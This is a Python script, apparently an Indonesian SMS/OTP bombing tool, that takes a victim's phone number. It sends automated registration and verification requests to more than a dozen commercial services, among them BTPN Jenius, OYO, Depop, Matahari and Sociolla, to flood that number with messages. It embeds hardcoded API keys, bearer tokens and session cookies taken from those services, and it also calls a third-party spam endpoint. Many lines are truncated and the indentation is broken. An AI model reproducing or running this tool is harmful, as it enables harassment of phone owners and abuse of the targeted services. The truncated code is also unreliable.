import os,sys,time,requests,re,json,random
from random import randrange as rg
print ("\033[00m")
def clear():
    os.system("clear")
def balik():
    f=input("\t[enter to back]")
    if f == "":
       os.system("python spam.py")
    else:
       sys.exit()
def baner():
    print ('''
\t
╔╗ ┬─┐┬ ┬┌┬┐┌─┐┬  ╔═╗┌─┐┌─┐┌┬┐┌┬┐┌─┐┬─┐
╠╩╗├┬┘│ │ │ ├─┤│  ╚═╗├─┘├─┤││││││├┤ ├┬┘
╚═╝┴└─└─┘ ┴ ┴ ┴┴─┘╚═╝┴  ┴ ┴┴ ┴┴ ┴└─┘┴└─
\t---------------------------------------
\nCreator  : BayuPutra
Facebook : Danma
WhatsApp : +6289606019836
==========================================''')
def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)def jenius():
    ua={
    "accept": "*/*",
    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
    "version": "2.36.1-7565",
    "accept-language": "id",
    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
    "Content-Type": "application/json",
    "Host": "api.btpn.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb>
    "User-Agent": "okhttp/3.12.1"
    }
    dat=json.dumps({"query":"mutation registerPhone($phone>
    r=requests.post("https://api.btpn.com/jenius", data=da>
def rupa():
     ua={
     "Host": "wapi.ruparupa.com",
     "Connection": "keep-alive",
     "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ>
     "Accept": "application/json",
     "Content-Type": "application/json",
     "X-Company-Name": "odi",
     "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A10>
     "user-platform": "mobile",
     "X-Frontend-Type": "mobile",
     "Origin": "https://m.ruparupa.com",
     "Referer": "https://m.ruparupa.com/verification?page=>
     "Accept-Encoding": "gzip, deflate, br",
     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0>
     }
     dat=json.dumps({"phone":no,"action":"register","chann>
     r = requests.post("https://wapi.ruparupa.com/auth/gen>
def mapclub():
ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107>
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.>
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/sign>
def oyo():
    ua={
    "Host": "identity-gateway.oyorooms.com",
    "consumer_host": "https://www.oyorooms.com",
    "accept-language": "id",
    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLU>
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107>
    "Content-Type": "application/json",
    "accept": "*/*",
    "origin": "https://www.oyorooms.com",
    "referer": "https://www.oyorooms.com/login",
    "Accept-Encoding": "gzip, deflate, br",
    }
    dat=json.dumps({"phone":c,"country_code":"+62","countr>
    r = requests.post("https://identity-gateway.oyorooms.c>
def depop():
ua={
"Host": "webapi.depop.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107>
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.>
    }
    dat=json.dumps({"phone_number":no,"country_code":"ID"})
    r = requests.put("https://webapi.depop.com/api/auth/v1>
def soplai():
    ua={
    "Host": "api.sooplai.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107>
    "Content-Type": "application/json",
    "origin": "https://www.sooplai.com",
    "referer": "https://www.sooplai.com/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.>
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://api.sooplai.com/customer/re>
def call():
    head = {
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F>
    "Content-Type":" application/x-www-form-urlencoded; ch>
    "Content-Type": "application/json",
    "Origin": "https://id.jagreward.com",
    "Referer": "https://id.jagreward.com/member/register/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.>
    "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b15847098>
    "_ga": "GA1.2.2037151396.1584709855",
    "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
    "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs>
    }
    r = requests.get("https://id.jagreward.com/member/veri>
def call2():
ua={
"Content-Type": "application/json",
    "Host": "srv3.sampingan.co.id",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.4.0"
    }
    dat=json.dumps({"countryCode":"+62","phoneNumber":c})
    r=requests.post("https://srv3.sampingan.co.id/auth/gen>
def alodoc():
    req=requests.post("https://nuubi.herokuapp.com/api/spa>
def olx():
    req=requests.post("https://www.olx.co.id/api/auth/auth>
def matahari():
     heder = {'Host': 'thor.matahari.com',
              'content-length': '230',
              'modulecode': 'MR',
              'origin': 'https://www.matahari.com',
              'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOi>
              'content-type': 'application/json',
              'accept': 'application/json, text/plain, */*>
              'clientid': 'mds_mweb',
              'user-agent': 'Mozilla/5.0 (Linux; Android 8>
              'sessionid': '1595084426451',
              'save-data': 'on',
              'referer': 'https://www.matahari.com/registe>
              'accept-encoding': 'gzip, deflate, br',
              'accept-language': 'id-ID,id;q=0.9,en-US;q=0>

     data = {'emailAddress': 'noobie@mail.com',
             'firstName': 'Noobie',
             'lastName': 'Gans',
             'mobileNumber': no,
             'mccCardNumber': '',
             'password': 'asecc123',
             'referralCode': '',
             'dateOfBirth': '09-05-1993',
'gender': 'Male',
             'registrationType': 'N'}
     sec = requests.post('https://thor.matahari.com/Mataha>
def socil():
headreg={
    "Host": "soco-api.sociolla.com",
    "Connection": "keep-alive",
    "Sec-Fetch-Mode": "cors",
    "Origin": "https://www.sociolla.com",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi >
    "Content-Type": "application/json;charset\u003dUTF-8",
    "Accept": "application/json, text/plain, */*",
    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
    "SOC-PLATFORM": "sociolla-web-mobile",
    "Sec-Fetch-Site": "same-site",
    "Referer": "https://www.sociolla.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0>
    }

    ses=requests.Session()
    reg=ses.post("https://soco-api.sociolla.com/auth/regis>
    token=reg.json()['data']['token']
    headotp={
    "Host": "soco-api.sociolla.com",
    "Connection": "keep-alive",
    "Sec-Fetch-Mode": "cors",
    "Origin": "https://www.sociolla.com",
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json;charset\u003dUTF-8",
    "Accept": "application/json, text/plain, */*",
    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
    "SOC-PLATFORM": "sociolla-web-mobile",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi >
    "Sec-Fetch-Site": "same-site",
,
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0>
    }
    rotp=ses.post("https://soco-api.sociolla.com/auth/otp/>
def klik():
    dat={'number':no}
    r=requests.post("https://nuubi.herokuapp.com/api/spam/>
def indo():
ua={
    "Host": "account-api-v1.klikindomaret.com",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107>
    "content-type": "application/json",
    "accept": "*/*",
    "origin": "https://account.klikindomaret.com",
    "referer": "https://account.klikindomaret.com/SMSVerif>
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.>
    r=requests.get("https://account-api-v1.klikindomaret.c>
def wa2():
    name="Danz"+str(random.randrange(11,99999))
    pas="termux"+str(random.randrange(111,999))
    ua={
    "Host": "qtva.id",
    "Connection": "keep-alive",
    "Accept": "text/html, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107>
    "Content-Type": "application/x-www-form-urlencoded; ch>
    "Origin": "https://qtva.id",
    "Referer": "https://qtva.id/page/register/siswa",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.>
    "Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSEL>
    dat={
    "namaDepan":name,
    "emailNope":no,
"password":pas,
    "konfirmasiPass":pas
    }
    r=requests.post("https://qtva.id/page/frames.php?f=eVB>
if __name__=="__main__":
     try:
          clear()
          baner()
          hh="+62"
          no=input("[+]Phone Number: ")
          c=no[1:12]
          w=hh+c
kata("Waiting....!!")
          jenius()
          oyo()
          mapclub()
          call()
          time.sleep(2)
          soplai()
          depop()
          rupa()
          matahari()
          socil()
          indo()
          olx()
          call2()
          time.sleep(2)
          alodoc()
          klik()
          wa2()
          time.sleep(2)
          kata("[•]Done..")
          balik()
     except KeyError:
             sys.exit()
     except KeyboardInterrupt:
             sys.exit()
except requests.exceptions.ConnectionError:
             sys.exit('connection error!')
     except TypeError:
             balik()
     except ValueError:
             balik()
